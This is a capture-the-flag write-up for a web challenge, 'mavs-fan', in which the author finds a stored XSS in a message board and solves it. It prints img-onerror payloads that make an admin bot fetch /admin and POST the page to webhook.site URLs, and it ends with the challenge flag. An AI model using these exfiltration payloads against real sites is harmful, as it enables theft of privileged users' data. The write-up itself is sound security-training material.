# mavs-fan - web

## Challenge

Just a Mavs fan trying to figure out what Nico Harrison cooking up for my team nowadays...

Hint - You can send a link to your post that the admin bot will visit.

## Solve

In this challenge we are provided a webpage where users can post messages. 

![mavs-1](https://github.com/user-attachments/assets/70c2beb9-22cf-4947-970f-24c66b566136)


When a message is posted, a URL is generated which can be sent to the 'admin bot' who will visit the post.

This seemed like an XXS so I firstly tested for script injection:

```html
<script>alert('working')</script>
```

Submitting this payload and visiting the URL presented no output so I assumed the application had some built in protection against it.

Next I tested for an event based XSS:

```html
<img src=x onerror=alert('working')>
```
- Setting img src to 'x' immediately triggers error as invalid URL
- `onerror` parameter executes JS when error occurs while loading image

This was successful, and the popup is displayed on the screen:

![mavs2](https://github.com/user-attachments/assets/e385a1da-4783-4f68-ae76-4c81b1d86d8b)

So we know we can use this method to execute code within the browser of the user visiting the post. Just need the right payload to read `/admin`.

Credit to my teammate `Solopie` for his initial solution which assisted me in developing mine:

***Solopies***
```html
<img src=x onerror='fetch("/admin").then(r => r.text()).then(html => fetch("https://webhook.site/fec2d565-693d-4010-9574-e7c9ffe7dd9b", {method: "POST", body:html}))' />
```

***Mine***
```html
<img src=x onerror='(async () => {
  let admin = await fetch("/admin");
  let text = await admin.text();
  fetch("https://webhook.site/d81d0cf2-a48a-4a3b-9135-f61410b83df0", { method: "POST", body: text });
})()'>
```
- `async()` is immediately called with `()` and enables use of `await` keyword
- `await` keyword makes the function pause the execution and wait for code to be successful before it continues
    - before attempting to store the `.text()` property of the HTML object `admin` in text, the program ensures that `/admin` has been fetched
    - likewise, before exfiltrating `text` to the web hook, the program ensures it has been successfully stored 
- `fetch("...", { method: "POST", body: text });`
    - Sends a POST request to webhook site containing `text` (the contents of the admin page)
- `()` at the end immediately calls the overall arrow function as soon as it is defined

Submitting the generated URL to the admin bot and checking the webhook site shows that the payload was successful:

![mavs3](https://github.com/user-attachments/assets/935f4044-3537-42b6-b4f7-49f3c75288a6)


`lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`
